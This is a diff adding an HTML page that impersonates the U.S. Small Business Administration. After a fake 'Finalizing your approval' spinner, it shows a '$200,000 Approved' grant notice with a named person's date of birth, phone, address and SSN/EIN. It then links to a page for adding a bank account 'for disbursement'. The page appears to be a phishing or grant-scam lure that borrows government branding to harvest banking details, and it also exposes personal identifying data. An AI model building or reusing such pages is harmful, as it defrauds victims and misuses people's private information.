@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Grant Disbursement | SBA</title>
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="images2.png">
+  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+  <link rel="apple-touch-icon" href="images2.png">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      color: #222;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* --- Watermark on whole page --- */
+    body::before {
+      content: "";
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: url("images2.png") center center no-repeat;
+      background-size: 300px;
+      opacity: 0.05;  /* faint watermark */
+      z-index: -1;
+      pointer-events: none;
+      transition: opacity 0.5s ease-in-out;
+    }
+    body.processing-active::before {
+      opacity: 0.25; /* stronger during processing */
+    }
+
+    /* Watermark on containers */
+    .form-container, form, .approval-box {
+      position: relative;
+      background: rgba(255,255,255,0.95);
+      border-radius: 8px;
+      overflow: hidden;
+      z-index: 1;
+    }
+    .form-container::before,
+    form::before,
+    .approval-box::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: url("flag.jpg") center center no-repeat;
+      background-size: 220px;
+      opacity: 0.08;
+      z-index: -1;
+    }
+
+    /* Header */
+    .gov-bar {
+      background: #f5f5f5;
+      font-size: 13px;
+      padding: 6px 12px;
+      border-bottom: 1px solid #ddd;
+    }
+    .gov-bar span { color: #333; }
+    .gov-bar a { color: #005ea2; text-decoration: none; margin-left: 6px; }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 16px;
+      border-bottom: 1px solid #ddd;
+    }
+    .header img { height: 40px; }
+    .header h1 { font-size: 20px; color: #005ea2; margin: 0; }
+
+    /* Main content */
+    .main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .approval-box {
+      background: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 700px;
+      text-align: center;
+      display: none; /* Hidden until processing finishes */
+    }
+
+    .approval-box h2 {
+      color: #005ea2;
+      margin-bottom: 10px;
+    }
+
+    .welcome-msg {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    .details {
+      text-align: left;
+      margin: 20px 0;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+    .details strong {
+      display: inline-block;
+      width: 260px;
+      color: #333;
+    }
+
+    /* Approved amount */
+    .approved-btn {
+      display: inline-block;
+      padding: 15px 30px;
+      font-size: 20px;
+      font-weight: bold;
+      background: linear-gradient(145deg, #00c851, #007e33);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      margin: 20px 0;
+      box-shadow: 5px 5px 15px rgba(0,0,0,0.2),
+                  -5px -5px 15px rgba(255,255,255,0.4);
+    }
+
+    /* Disbursement button */
+    .disburse-btn {
+      display: inline-block;
+      padding: 12px 24px;
+      background: #005ea2;
+      color: #fff;
+      font-size: 16px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: bold;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+      transition: background 0.3s;
+    }
+    .disburse-btn:hover { background: #004080; }
+
+    /* Processing animation */
+    .processing {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #005ea2;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    /* Footer */
+    footer {
+      background: #f5f5f5;
+      border-top: 1px solid #ddd;
+      text-align: center;
+      font-size: 14px;
+      padding: 15px;
+      color: #444;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .details strong { width: 100%; }
+    }
+  </style>
+</head>
+<body class="processing-active">
+
+  <!-- Gov bar -->
+  <div class="gov-bar">
+    <span>🇺🇸 An official website of the United States government</span>
+    <a href="#">Here’s how you know</a>
+  </div>
+
+  <!-- Header -->
+  <div class="header">
+    <img src="images2.png" alt="SBA Logo">
+    <h1>Grant Approval Notice</h1>
+  </div>
+
+  <!-- Main -->
+  <div class="main">
+
+    <!-- Processing Animation -->
+    <div class="processing" id="processingBox">
+      <div class="spinner"></div>
+      <p>Finalizing your approval... Please wait</p>
+    </div>
+
+    <!-- Approval Content -->
+    <div class="approval-box" id="approvalBox">
+      <h2>🎉 Congratulations!</h2>
+      <p class="welcome-msg" id="welcomeMsg"></p>
+
+      <div class="details">
+        <p><strong>Full Legal Name:</strong> Robert Middlebrooks jr</p>
+        <p><strong>Date of Birth:</strong> February 17, 1982</p>
+        <p><strong>Email Address:</strong> Shootdastars2026@gmail.com</p>
+        <p><strong>Phone Number:</strong> (708) 353-1377</p>
+        <p><strong>Mailing Address:</strong> 17W240 22nd, 3rd Floor, Oakbrook Terrace, IL 60181</p>
+        <p><strong>(SSN)/(EIN):</strong> 39-4862042</p>
+        <p><strong>Unique Entity Identifier (UEI):</strong> AGM133745USA</p>
+        <p><strong>Organization/Business Name:</strong> Limitless Skies Consulting LLC</p>
+        <p><strong>Title/Role:</strong> Executive Director</p>
+      </div>
+
+      <!-- Approved Amount -->
+      <button class="approved-btn">$200,000 Approved</button>
+
+      <!-- Disbursement -->
+      <div>
+        <a href="Shootdastars2026@gmail.com-disbursement.html" class="disburse-btn">Add Bank Account for Disbursement</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    © 2025 U.S. Small Business Administration | All Rights Reserved
+  </footer>
+
+  <script>
+    // Greeting logic
+    function getGreeting() {
+      const now = new Date();
+      const hour = now.getHours();
+      let greeting = "Good evening";
+      if (hour < 12) greeting = "Good morning";
+      else if (hour < 18) greeting = "Good afternoon";
+
+      const applicantName = "Robert Middlebrooks"; // Replace dynamically if needed
+      return `${greeting}, welcome back ${applicantName}.`;
+    }
+
+    // Show processing for 6s then approval
+    setTimeout(() => {
+      document.body.classList.remove("processing-active");
+      document.getElementById("processingBox").style.display = "none";
+      document.getElementById("approvalBox").style.display = "block";
+      document.getElementById("welcomeMsg").textContent = getGreeting();
+    }, 6000);
+  </script>
+</body>
+</html>
